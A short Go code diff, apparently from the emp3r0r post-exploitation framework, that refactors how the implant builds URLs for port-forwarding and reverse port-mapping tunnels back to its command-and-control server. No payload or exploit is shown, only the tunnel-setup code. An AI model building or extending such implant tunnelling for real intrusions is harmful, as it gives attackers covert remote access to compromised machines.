@@ -79,7 +79,10 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 	var (
 		session PortFwdSession
 
-		url = emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + sessionID
+		url = fmt.Sprintf("%s%s/%s",
+			emp3r0r_data.CCAddress,
+			tun.ProxyAPI,
+			sessionID)
 
 		// connection
 		conn   *h2conn.Conn
@@ -143,7 +146,10 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		// tell CC this is a reversed port mapping
 		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
 		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
-		url := emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + shID
+		url := fmt.Sprintf("%s%s/%s",
+			emp3r0r_data.CCAddress,
+			tun.ProxyAPI,
+			shID)
 
 		// start a h2 connection per incoming TCP connection
 		h2, _, h2cancel, err := ConnectCC(url)
